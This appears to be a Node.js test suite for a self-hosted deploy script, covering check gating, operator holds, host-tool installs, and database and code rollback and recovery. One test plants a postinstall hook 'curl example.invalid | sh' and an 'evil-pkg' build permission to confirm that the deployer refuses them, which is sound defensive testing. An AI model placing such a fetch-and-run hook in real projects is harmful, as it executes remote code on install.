import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  renameSync,
  statSync,
  unlinkSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';
import test from 'node:test';
import { makeTestTempDir } from '../test-tmpdir.mjs';

const DEPLOY = join(import.meta.dirname, 'deploy-self.sh');
const WATCH = join(import.meta.dirname, 'deploy-watch.sh');
const BOOTSTRAP = join(import.meta.dirname, 'bootstrap-deploy.sh');
const SYSTEM_PATH = '/usr/bin:/bin';
const OWNER_TOKEN = 'fixture-owner-token';

function git(cwd, ...args) {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    env: {
      PATH: SYSTEM_PATH,
      GIT_AUTHOR_NAME: 't',
      GIT_AUTHOR_EMAIL: 't@example.invalid',
      GIT_COMMITTER_NAME: 't',
      GIT_COMMITTER_EMAIL: 't@example.invalid',
      GIT_CONFIG_NOSYSTEM: '1',
      HOME: cwd,
    },
  }).trim();
}

function sqlite(db, sql) {
  return execFileSync('sqlite3', [db, sql], {
    encoding: 'utf8',
    env: { PATH: SYSTEM_PATH },
  }).trim();
}

function fakeTool(bin, name, body) {
  const path = join(bin, name);
  writeFileSync(path, `#!/bin/bash\n${body}\n`);
  chmodSync(path, 0o700);
}

function commit(work, message, { allowBuilds = 'esbuild: true', date, files = {} } = {}) {
  writeFileSync(
    join(work, 'pnpm-workspace.yaml'),
    `packages:\n  - apps/*\n\nallowBuilds:\n  ${allowBuilds}\n\ncatalog:\n  x: 1\n`,
  );
  writeFileSync(join(work, 'marker.txt'), `${message}\n`);
  mkdirSync(join(work, 'apps/server/src/db'), { recursive: true });
  writeFileSync(join(work, 'apps/server/src/db/client.ts'), '');
  for (const [rel, contents] of Object.entries(files)) {
    mkdirSync(join(work, rel, '..'), { recursive: true });
    writeFileSync(join(work, rel), contents);
  }
  git(
    work,
    'add',
    'pnpm-workspace.yaml',
    'marker.txt',
    'apps/server/src/db/client.ts',
    ...Object.keys(files),
    ...(existsSync(join(work, 'package.json')) ? ['package.json'] : []),
  );
  const env = date ? ['-c', `user.name=t`] : [];
  execFileSync('git', [...env, 'commit', '-q', '-m', message], {
    cwd: work,
    env: {
      PATH: SYSTEM_PATH,
      HOME: work,
      GIT_CONFIG_NOSYSTEM: '1',
      GIT_AUTHOR_NAME: 't',
      GIT_AUTHOR_EMAIL: 't@example.invalid',
      GIT_COMMITTER_NAME: 't',
      GIT_COMMITTER_EMAIL: 't@example.invalid',
      ...(date ? { GIT_COMMITTER_DATE: date, GIT_AUTHOR_DATE: date } : {}),
    },
  });
  return git(work, 'rev-parse', 'HEAD');
}

function fixture({ claimed = 0, digestClaimed = 0, heartbeatAgeMs = null, seedFiles = {} } = {}) {
  const dir = makeTestTempDir('deploy-self-');
  const origin = join(dir, 'origin.git');
  const work = join(dir, 'work');
  const checkout = join(dir, 'checkout');
  const data = join(dir, 'data');
  const state = join(dir, 'state');
  const backups = join(dir, 'backups');
  const fake = join(dir, 'fake');
  const bin = join(dir, 'bin');
  const tokenFile = join(dir, '.cairn', 'token');
  for (const path of [work, data, fake, bin, join(dir, '.cairn')])
    mkdirSync(path, { recursive: true });
  writeFileSync(tokenFile, `CAIRN_TOKEN=${OWNER_TOKEN}\n`, { mode: 0o600 });
  git(dir, 'init', '-q', '--bare', '-b', 'main', origin);
  git(work, 'init', '-q', '-b', 'main');
  const previous = commit(work, 'previous', { files: seedFiles });
  git(work, 'remote', 'add', 'origin', origin);
  git(work, 'push', '-q', 'origin', 'main');
  git(dir, 'clone', '-q', origin, checkout);
  git(checkout, 'checkout', '-q', '--detach', previous);

  const db = join(data, 'server.db');
  sqlite(
    db,
    `create table step(id text primary key, buildId text, status text, lastHeartbeatAt integer, machineId text default 'm1');
     create table machine(id text primary key, name text, lastSeenAt integer, maxConcurrent integer default 1);
     create table deploy_lease(id text primary key, owner text not null, status text not null, expiresAt integer not null);
     create table __drizzle_migrations(id integer primary key, hash text);
     insert into machine values ('m1', 'omarchy', 0, 1);
     insert into __drizzle_migrations(hash) values ('m0');`,
  );
  const heartbeat = heartbeatAgeMs === null ? 'null' : String(Date.now() - heartbeatAgeMs);
  for (let i = 0; i < claimed; i++)
    sqlite(
      db,
      `insert into step(id, buildId, status, lastHeartbeatAt) values ('s${i}', 'build-${i}', 'claimed', ${heartbeat})`,
    );
  for (let i = 0; i < digestClaimed; i++)
    sqlite(
      db,
      `insert into step(id, buildId, status, lastHeartbeatAt) values ('d${i}', 'chief-digest-chief-x', 'claimed', ${heartbeat})`,
    );

  fakeTool(
    bin,
    'gh-wrapper',
    `"${process.execPath}" "${join(import.meta.dirname, 'host/tools/app-token/as-bot-policy.mjs')}" "$@" || exit $?
exec env GH_TOKEN=fixture-scoped-app-token "$@"`,
  );

  fakeTool(
    bin,
    'gh',
    `echo "gh $*" >> "${fake}/gh.log"
[ "\${GH_TOKEN-}" != fixture-scoped-app-token ] || echo authenticated >> "${fake}/gh-auth.log"
case "$1 $2" in
  "api repos/"*)
    sha=$(echo "$2" | sed -E 's#.*/commits/([0-9a-f]+)/check-runs.*#\\1#')
    if [ -f "${fake}/checks-$sha" ]; then cat "${fake}/checks-$sha"; else printf 'check\\tsuccess\\npack-smoke\\tsuccess\\ne2e-gate\\tsuccess\\n'; fi ;;
  "issue list")
    if [[ "$*" == *autonomy-paused* ]]; then cat "${fake}/paused" 2>/dev/null || echo 0
    else cat "${fake}/lag-issue" 2>/dev/null || true; fi ;;
  "issue create") echo "https://github.com/x/y/issues/77" ;;
  "issue close") [ ! -f "${fake}/lag-close-fail" ] || exit 1 ;;
esac`,
  );
  fakeTool(
    bin,
    'pnpm',
    `for variable in GH_TOKEN GITHUB_TOKEN GIT_CONFIG_VALUE_0; do
  [ -z "\${!variable-}" ] || echo "$variable" >> "${fake}/artifact-credential-names"
done
echo "pnpm $* @ $(git -C "${checkout}" rev-parse HEAD 2>/dev/null)" >> "${fake}/pnpm.log"; [ -f "${fake}/pnpm-fail" ] && [[ "$*" == *web* ]] && exit 1; exit 0`,
  );
  fakeTool(
    bin,
    'node',
    `for variable in GH_TOKEN GITHUB_TOKEN GIT_CONFIG_VALUE_0; do
  [ -z "\${!variable-}" ] || echo "$variable" >> "${fake}/artifact-credential-names"
done
echo "node $*" >> "${fake}/node.log"
[ -f "${fake}/migrate-fail" ] && exit 1
db="\${@: -1}"
sqlite3 "$db" "insert into __drizzle_migrations(hash) values ('m1')"`,
  );
  fakeTool(
    bin,
    'systemctl',
    `if [ "$2" = is-enabled ]; then
  case "$4" in
    cairn-daemon-orb.service) [ -f "${fake}/orb-enabled" ]; exit $? ;;
    *) exit 1 ;;
  esac
fi
echo "systemctl $*" >> "${fake}/systemctl.log"
if [ "$2" = show ]; then
  case "$3" in
    cairn-daemon-orb.service) slug=orb ;;
    *) exit 1 ;;
  esac
  count=$(cat "${fake}/$slug-health-count" 2>/dev/null || echo 0)
  count=$((count + 1))
  echo "$count" > "${fake}/$slug-health-count"
  mode=$(cat "${fake}/$slug-health-mode" 2>/dev/null || true)
  state=active; substate=running; pid=123; restarts=0
  case "$mode" in
    inactive) state=activating; substate=auto-restart; pid=0 ;;
    restarts) restarts=$count ;;
    pid) pid=$((123 + count)) ;;
    one-active) if [ "$count" -gt 1 ]; then state=failed; substate=failed; pid=0; fi ;;
  esac
  printf 'ActiveState=%s\\nSubState=%s\\nMainPID=%s\\nNRestarts=%s\\n' "$state" "$substate" "$pid" "$restarts"
  exit 0
fi
[ ! -f "${fake}/orb-$2-fail" ] || [ "$3" != cairn-daemon-orb.service ] || exit 1
[ ! -f "${fake}/phase-on-start" ] || [ "$2" != start ] || echo "start $3 @ $(sed -n 's/^phase=//p' "${dir}/state/in-progress" 2>/dev/null)" >> "${fake}/phases.log"
if [ "$2 $3" = "start cairn-server.service" ]; then
  head=$(git -C "${checkout}" rev-parse HEAD)
  [ "$head" = "${previous}" ] || sqlite3 "${db}" "insert or ignore into __drizzle_migrations(id, hash) values (2, 'm1')"
  if [ "$head" = "${previous}" ] && [ -f "${fake}/broken-previous" ]; then
    rm -f "${fake}/up"
  elif [ "$head" = "$(cat "${fake}/broken-sha" 2>/dev/null)" ]; then
    rm -f "${fake}/up"
    sqlite3 "${db}" "update machine set lastSeenAt = lastSeenAt + 1"
    [ ! -f "${fake}/machine-write-on-broken-start" ] || sqlite3 "${db}" "update machine set maxConcurrent = 4"
    [ ! -f "${fake}/write-on-broken-start" ] || sqlite3 "${db}" "insert or ignore into step(id, status) values ('written-after', 'done')"
    [ ! -f "${fake}/column-on-broken-start" ] || sqlite3 "${db}" "alter table step add column note text; alter table step add column tier text default 'low'"
    [ ! -s "${fake}/column-on-broken-start" ] || sqlite3 "${db}" "update step set note = '$(cat "${fake}/column-on-broken-start")'"
  else touch "${fake}/up"; sqlite3 "${db}" "update machine set lastSeenAt = (cast(strftime('%s','now') as integer) + 5) * 1000"; fi
fi
[ "$2 $3" = "stop cairn-server.service" ] && rm -f "${fake}/up"
if [ "$2 $3" = "start cairn-daemon.service" ]; then
  sqlite3 "${db}" "update machine set lastSeenAt = (cast(strftime('%s','now') as integer) + 5) * 1000"
fi
exit 0`,
  );
  writeFileSync(
    join(fake, 'lease-api.mjs'),
    `
import { appendFileSync, existsSync, readFileSync, writeFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
const args = process.argv.slice(2);
const value = (flag) => args[args.indexOf(flag) + 1];
const method = args.includes('-X') ? value('-X') : 'GET';
const sql = (query) => execFileSync('sqlite3', ['${db}', query], { encoding: 'utf8' }).trim();
const ownerToken = existsSync('${fake}/lease-owner-token') ? readFileSync('${fake}/lease-owner-token', 'utf8') : '${OWNER_TOKEN}';
const authorized = readFileSync(0, 'utf8').includes('header = "Authorization: Bearer ' + ownerToken + '"');
appendFileSync('${fake}/lease-requests.log', method + ' ' + (authorized ? 'owner' : 'anonymous') + ' ' + JSON.stringify(args) + '\\n');
if (existsSync('${fake}/lease-timeout')) {
  process.stderr.write('curl: (28) Operation timed out after 10002 milliseconds with 0 bytes received\\n');
  process.stdout.write('000');
  process.exit(28);
}
let status = 200;
let row = JSON.parse(sql("select json_object('owner',owner,'status',status,'expiresAt',expiresAt) from deploy_lease where id='server'") || '{"owner":null,"status":"accepting","expiresAt":0}');
if (existsSync('${fake}/lease-unsupported')) status = 404;
else if (!authorized) {
  status = 401;
  row = { error: 'Unauthorized' };
} else if (method === 'DELETE' && existsSync('${fake}/lease-delete-fail')) status = 503;
else if (method === 'DELETE' && row.owner === JSON.parse(value('--data-binary')).owner) {
  row = { ...row, status: 'accepting', expiresAt: 0 };
  sql("update deploy_lease set status='accepting',expiresAt=0 where id='server'");
  writeFileSync('${fake}/claims-woken', '');
} else if (method === 'PUT') {
  const body = JSON.parse(value('--data-binary'));
  row = { owner: body.owner, status: 'draining', expiresAt: Date.now() + body.ttlMs };
  sql("insert or replace into deploy_lease values ('server','" + row.owner + "','draining'," + row.expiresAt + ")");
  writeFileSync('${fake}/claims-paused', '');
  if (existsSync('${fake}/continuous')) sql("update step set status='done' where status='claimed'");
} else if (method === 'GET' && existsSync('${fake}/continuous') && row.status === 'draining') {
  sql("update step set status='done' where status='claimed'");
}
writeFileSync(value('-o'), JSON.stringify(row));
process.stdout.write(String(status));
`,
  );
  fakeTool(
    bin,
    'curl',
    `url="\${@: -1}"
if [[ "$url" == */api/server/deploy/lease ]]; then exec "${process.execPath}" "${fake}/lease-api.mjs" "$@"; fi
if [ -f "${fake}/up" ]; then
  case "$url" in */app) printf 200 ;; */api/user/me) printf 401 ;; *) printf 404 ;; esac
else printf 000; fi`,
  );
  fakeTool(bin, 'hostname', 'echo omarchy');

  const env = {
    PATH: `${bin}:${SYSTEM_PATH}`,
    HOME: dir,
    GIT_CONFIG_NOSYSTEM: '1',
    CAIRN_CHECKOUT: checkout,
    CAIRN_DATA_DIR: data,
    CAIRN_DEPLOY_STATE: state,
    CAIRN_DEPLOY_BACKUPS: backups,
    CAIRN_DEPLOY_SCRATCH: join(dir, 'scratch'),
    CAIRN_REPO: 'xiechimon/cairn',
    CAIRN_GH_WRAPPER: join(bin, 'gh-wrapper'),
    CAIRN_HEALTH_URL: 'http://127.0.0.1:8787',
    CAIRN_HEALTH_TRIES: '3',
    CAIRN_HEALTH_INTERVAL: '0',
    CAIRN_DEPLOY_STEP_WAIT_SECONDS: '0',
  };
  const run = (script, args, extra = {}) =>
    spawnSync('/bin/bash', [script, ...args], { encoding: 'utf8', env: { ...env, ...extra } });
  const log = (name) =>
    existsSync(join(fake, name)) ? readFileSync(join(fake, name), 'utf8') : '';
  return { dir, work, checkout, data, db, state, backups, fake, previous, run, log, tokenFile };
}

function pushTarget(f, message = 'target', options) {
  const sha = commit(f.work, message, options);
  git(f.work, 'push', '-q', 'origin', 'main');
  return sha;
}

test('refuses a malformed SHA and a SHA that is not on main', () => {
  const f = fixture();
  assert.equal(f.run(DEPLOY, ['abc']).status, 2);
  git(f.work, 'checkout', '-q', '-b', 'side');
  const side = commit(f.work, 'side');
  git(f.work, 'push', '-q', 'origin', 'side');
  const result = f.run(DEPLOY, [side]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(result.stderr, /not on origin\/main/);
  assert.equal(f.log('systemctl.log'), '');
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
});

test('refuses a SHA whose required checks are not all green', () => {
  for (const checks of [
    'check\tsuccess\npack-smoke\tfailure\ne2e-gate\tsuccess\n',
    'check\tsuccess\n',
  ]) {
    const f = fixture();
    const target = pushTarget(f);
    writeFileSync(join(f.fake, `checks-${target}`), checks);
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, /required check (pack-smoke|e2e-gate) is not green/);
    assert.equal(f.log('systemctl.log'), '');
  }
});

test('refuses while autonomy is paused', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'paused'), '1\n');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 2);
  assert.match(result.stderr, /autonomy-paused/);
});

test('refuses a target that changes install-script permissions or hooks', () => {
  for (const allowBuilds of [
    'esbuild: true\n  evil-pkg: true',
    'esbuild: true\n  evil-pkg: true # approved',
  ]) {
    const f = fixture();
    const target = pushTarget(f, 'target', { allowBuilds });
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, /allowBuilds/);
    assert.equal(f.log('pnpm.log'), '');
  }
  const f = fixture();
  writeFileSync(
    join(f.work, 'package.json'),
    '{"scripts":{"postinstall":"curl example.invalid | sh"}}\n',
  );
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(result.stderr, /install hooks/);
  assert.equal(f.log('pnpm.log'), '');
});

test('refuses the same postinstall added to two manifests', () => {
  const f = fixture();
  for (const rel of ['package.json', 'apps/a/package.json']) {
    mkdirSync(join(f.work, rel, '..'), { recursive: true });
    writeFileSync(join(f.work, rel), '{"scripts":{"postinstall":"node x.js"}}\n');
  }
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(result.stderr, /install hooks/);
});

test('ignores a trailing comma added after an unchanged prepare hook', () => {
  const f = fixture();
  writeFileSync(
    join(f.work, 'package.json'),
    '{\n  "scripts": {\n    "prepare": "husky"\n  }\n}\n',
  );
  git(f.work, 'add', 'package.json');
  git(f.work, 'commit', '-q', '-m', 'prepare hook');
  git(f.work, 'push', '-q', 'origin', 'main');
  const base = git(f.work, 'rev-parse', 'HEAD');
  git(f.checkout, 'fetch', '-q', 'origin', 'main');
  git(f.checkout, 'checkout', '-q', base);
  writeFileSync(
    join(f.work, 'package.json'),
    '{\n  "scripts": {\n    "prepare": "husky",\n    "other": "true"\n  }\n}\n',
  );
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.doesNotMatch(result.stderr, /install hooks/);
});

test('respects an explicit operator hold without acquiring a lease', () => {
  const f = fixture();
  const target = pushTarget(f);
  mkdirSync(f.state, { recursive: true });
  writeFileSync(join(f.state, 'hold'), 'orb trial-one\n');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 75);
  assert.match(result.stderr, /hold: orb trial-one/);
  assert.equal(sqlite(f.db, 'select count(*) from deploy_lease'), '0');
});

test('installs host tools from the deployed commit and records the installed SHA', () => {
  const f = fixture();
  const target = pushTarget(f, 'target', {
    files: {
      'scripts/ops/host/tools/governor/brake.sh': '#!/bin/bash\necho new\n',
      'scripts/ops/host/tools/governor/notes.md': 'notes\n',
    },
  });
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(statSync(join(f.dir, '.cairn/tools/governor/notes.md')).mode & 0o777, 0o644);
  const host = join(f.dir, '.cairn/tools/governor/brake.sh');
  assert.equal(readFileSync(host, 'utf8'), '#!/bin/bash\necho new\n');
  assert.equal(statSync(host).mode & 0o777, 0o755);
  assert.equal(readFileSync(join(f.state, 'host-tools-sha'), 'utf8').trim(), target);
});

test('keeps a hand-edited host tool, reports it, and never clobbers it', () => {
  const f = fixture();
  const target = pushTarget(f, 'target', {
    files: { 'scripts/ops/host/tools/governor/brake.sh': '#!/bin/bash\necho new\n' },
  });
  mkdirSync(join(f.dir, '.cairn/tools/governor'), { recursive: true });
  writeFileSync(join(f.dir, '.cairn/tools/governor/brake.sh'), '#!/bin/bash\necho local\n', {
    mode: 0o755,
  });
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(
    readFileSync(join(f.dir, '.cairn/tools/governor/brake.sh'), 'utf8'),
    '#!/bin/bash\necho local\n',
  );
  assert.match(result.stdout, /kept hand-edited files/);
  assert.match(f.log('gh.log'), /issue create.*Host tools differ/);
  assert.equal(existsSync(join(f.state, 'alarms/host-tools-edited')), true);
});

test('updates a host tool that still matches the previous revision', () => {
  const f = fixture({
    seedFiles: { 'scripts/ops/host/tools/governor/brake.sh': '#!/bin/bash\necho old\n' },
  });
  mkdirSync(join(f.dir, '.cairn/tools/governor'), { recursive: true });
  writeFileSync(join(f.dir, '.cairn/tools/governor/brake.sh'), '#!/bin/bash\necho old\n');
  const target = pushTarget(f, 'target', {
    files: { 'scripts/ops/host/tools/governor/brake.sh': '#!/bin/bash\necho new\n' },
  });
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(
    readFileSync(join(f.dir, '.cairn/tools/governor/brake.sh'), 'utf8'),
    '#!/bin/bash\necho new\n',
  );
  assert.doesNotMatch(result.stdout, /kept hand-edited files/);
});

test('stops before touching services when the migration rehearsal fails', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'migrate-fail'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /migration rehearsal failed/);
  assert.equal(f.log('systemctl.log'), '');
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
  assert.equal(sqlite(f.db, 'select count(*) from __drizzle_migrations'), '1');
  assert.ok(existsSync(join(f.state, 'failed', target)));
});

test('deploys a green main SHA, restarts server before daemon and records the SHA', () => {
  const f = fixture();
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), target);
  assert.deepEqual(f.log('systemctl.log').trim().split('\n'), [
    'systemctl --user stop cairn-daemon.service',
    'systemctl --user stop cairn-server.service',
    'systemctl --user start cairn-server.service',
    'systemctl --user start cairn-daemon.service',
  ]);
  assert.match(f.log('pnpm.log'), new RegExp(`install --frozen-lockfile .*@ ${target}`));
  assert.match(f.log('pnpm.log'), /-C apps\/daemon build/);
  assert.match(f.log('pnpm.log'), /-C apps\/web build/);
  for (const path of [join(f.state, 'deployed.json'), join(f.data, 'deploy.json')]) {
    const record = JSON.parse(readFileSync(path, 'utf8'));
    assert.equal(record.sha, target);
    assert.equal(record.previous, f.previous);
    assert.equal(record.result, 'deployed');
  }
  const snapshots = readdirSync(f.backups).filter((name) => name.startsWith('stopped-'));
  assert.equal(snapshots.length, 1);

  const again = f.run(DEPLOY, [target]);
  assert.equal(again.status, 0);
  assert.match(again.stdout, /already deployed/);
});

test('feeds deploy record JSON to an executable local notify hook', () => {
  const f = fixture();
  const target = pushTarget(f);
  const notifyLog = join(f.fake, 'notify.log');
  const hook = join(f.state, 'notify.sh');
  mkdirSync(f.state, { recursive: true });
  writeFileSync(hook, `#!/bin/bash\ncat >> "${notifyLog}"\n`);
  chmodSync(hook, 0o700);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /deploy notify /);
  const notified = JSON.parse(readFileSync(notifyLog, 'utf8'));
  assert.equal(notified.sha, target);
  assert.equal(notified.previous, f.previous);
  assert.equal(notified.result, 'deployed');
  assert.equal(notified.host, 'omarchy');
});

test('ignores a failing or non-executable notify hook', () => {
  const f = fixture();
  const target = pushTarget(f);
  mkdirSync(f.state, { recursive: true });
  const failing = join(f.state, 'notify.sh');
  writeFileSync(failing, '#!/bin/bash\nexit 7\n');
  chmodSync(failing, 0o700);
  const failed = f.run(DEPLOY, [target]);
  assert.equal(failed.status, 0, failed.stderr);
  assert.match(failed.stdout, /deploy notify exited 7 \(ignored\)/);
  assert.equal(JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8')).result, 'deployed');

  const g = fixture();
  const next = pushTarget(g);
  mkdirSync(g.state, { recursive: true });
  const inert = join(g.state, 'notify.sh');
  const notifyLog = join(g.fake, 'notify.log');
  writeFileSync(inert, `#!/bin/bash\necho ran >> "${notifyLog}"\n`);
  chmodSync(inert, 0o600);
  const skipped = g.run(DEPLOY, [next]);
  assert.equal(skipped.status, 0, skipped.stderr);
  assert.match(skipped.stdout, /deploy notify skipped: .* is not executable/);
  assert.equal(existsSync(notifyLog), false);
});

test('rolls code and database back when the new server fails its health check', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  sqlite(f.db, "insert into step(id, status) values ('done-before', 'done')");
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /health check failed/);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
  assert.equal(sqlite(f.db, "select count(*) from step where id = 'done-before'"), '1');
  assert.equal(sqlite(f.db, 'select count(*) from __drizzle_migrations'), '1');
  const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
  assert.equal(record.sha, f.previous);
  assert.equal(record.result, 'rolled-back');
  assert.equal(record.failed, target);
  assert.ok(existsSync(join(f.state, 'failed', target)));
  assert.match(f.log('pnpm.log'), new RegExp(`install --frozen-lockfile .*@ ${f.previous}`));
  assert.ok(readdirSync(f.backups).some((name) => name.startsWith('failed-')));
});

test('keeps the DB and rolls back only code when data changed after the snapshot', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'write-on-broken-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /kept the DB/);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
  assert.equal(sqlite(f.db, "select count(*) from step where id = 'written-after'"), '1');
  assert.equal(sqlite(f.db, 'select count(*) from __drizzle_migrations'), '2');
  const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
  assert.equal(record.result, 'rolled-back-code');
  assert.ok(!readdirSync(f.backups).some((name) => name.startsWith('failed-')));
});

test('treats values in a column added after the snapshot as writes, but not its default', () => {
  for (const [note, expected] of [
    ['written', 'rolled-back-code'],
    ['', 'rolled-back'],
  ]) {
    const f = fixture();
    sqlite(f.db, "insert into step(id, status) values ('done-before', 'done')");
    const target = pushTarget(f);
    writeFileSync(join(f.fake, 'broken-sha'), target);
    writeFileSync(join(f.fake, 'column-on-broken-start'), note);
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 1, result.stderr);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, expected, result.stderr);
  }
});

test('counts a persistent machine field as a write but not a heartbeat', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'machine-write-on-broken-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
  assert.equal(record.result, 'rolled-back-code');
  assert.equal(sqlite(f.db, 'select maxConcurrent from machine'), '4');
});

test('keeps the written DB and reports critical when the previous build is unhealthy too', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'broken-previous'), '');
  writeFileSync(join(f.fake, 'write-on-broken-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 3, result.stderr);
  assert.match(result.stderr, /CRITICAL: .* kept that DB/);
  assert.equal(sqlite(f.db, "select count(*) from step where id = 'written-after'"), '1');
  assert.ok(!readdirSync(f.backups).some((name) => name.startsWith('failed-')));
  assert.ok(!existsSync(join(f.state, 'in-progress')));
});

test('recovers an interrupted switch: finishes a healthy target, rolls back an unhealthy one', () => {
  for (const broken of [false, true]) {
    const f = fixture();
    const target = pushTarget(f);
    git(f.checkout, 'fetch', '-q', 'origin', 'main');
    git(f.checkout, 'checkout', '-q', '--detach', target);
    mkdirSync(f.state, { recursive: true });
    mkdirSync(f.backups, { recursive: true });
    const snapshot = join(f.backups, 'stopped-interrupted.db');
    sqlite(f.db, `vacuum into '${snapshot}'`);
    writeFileSync(
      join(f.state, 'in-progress'),
      `phase=switching\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\n`,
    );
    if (broken) writeFileSync(join(f.fake, 'broken-sha'), target);
    const result = f.run(DEPLOY, ['--recover']);
    assert.equal(result.status, broken ? 1 : 0, result.stderr);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, broken ? 'rolled-back' : 'deployed');
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), broken ? f.previous : target);
    assert.ok(!existsSync(join(f.state, 'in-progress')));
  }
});

test('recovers a rollback killed while swapping the DB, before any service starts', () => {
  for (const point of ['before-move', 'after-move', 'mid-copy']) {
    const f = fixture();
    sqlite(f.db, "insert into step(id, status) values ('in-snapshot', 'done')");
    const target = pushTarget(f);
    git(f.checkout, 'fetch', '-q', 'origin', 'main');
    git(f.checkout, 'checkout', '-q', '--detach', target);
    mkdirSync(f.state, { recursive: true });
    mkdirSync(f.backups, { recursive: true });
    const snapshot = join(f.backups, 'stopped-interrupted.db');
    sqlite(f.db, `vacuum into '${snapshot}'`);
    sqlite(f.db, "insert into step(id, status) values ('failed-only', 'done')");
    const failedDir = join(f.backups, 'failed-interrupted');
    mkdirSync(failedDir);
    if (point !== 'before-move') renameSync(f.db, join(failedDir, 'server.db'));
    if (point === 'mid-copy') writeFileSync(`${f.db}.restoring`, 'partial');
    writeFileSync(
      join(f.state, 'in-progress'),
      `phase=restoring\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\nfailed=${failedDir}\n`,
    );
    const result = f.run(DEPLOY, ['--recover']);
    assert.equal(result.status, 1, `${point}: ${result.stderr}`);
    assert.equal(sqlite(f.db, "select count(*) from step where id = 'in-snapshot'"), '1');
    assert.equal(sqlite(f.db, "select count(*) from step where id = 'failed-only'"), '0');
    assert.ok(
      readdirSync(failedDir).some((name) => name.startsWith('server.db')),
      point,
    );
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, 'rolled-back');
    assert.ok(!existsSync(join(f.state, 'in-progress')));
    const starts = f
      .log('systemctl.log')
      .split('\n')
      .filter((line) => line.includes('start'));
    assert.deepEqual(starts, [
      'systemctl --user start cairn-server.service',
      'systemctl --user start cairn-daemon.service',
    ]);
  }
});

test('recovery after the snapshot was restored and services started keeps their new writes', () => {
  for (const checkoutAt of ['previous', 'target']) {
    const f = fixture();
    const target = pushTarget(f);
    git(f.checkout, 'fetch', '-q', 'origin', 'main');
    if (checkoutAt === 'target') git(f.checkout, 'checkout', '-q', '--detach', target);
    mkdirSync(f.state, { recursive: true });
    mkdirSync(f.backups, { recursive: true });
    const snapshot = join(f.backups, 'stopped-interrupted.db');
    sqlite(f.db, `vacuum into '${snapshot}'`);
    sqlite(f.db, "insert into step(id, status) values ('written-by-restarted-previous', 'done')");
    const failedDir = join(f.backups, 'failed-interrupted');
    mkdirSync(failedDir);
    writeFileSync(
      join(f.state, 'in-progress'),
      `phase=restored\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\nfailed=${failedDir}\n`,
    );
    const result = f.run(DEPLOY, ['--recover']);
    assert.equal(result.status, 1, `${checkoutAt}: ${result.stderr}`);
    assert.equal(
      sqlite(f.db, "select count(*) from step where id = 'written-by-restarted-previous'"),
      '1',
    );
    assert.deepEqual(readdirSync(failedDir), []);
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, 'rolled-back');
    assert.ok(!existsSync(join(f.state, 'in-progress')));
  }
});

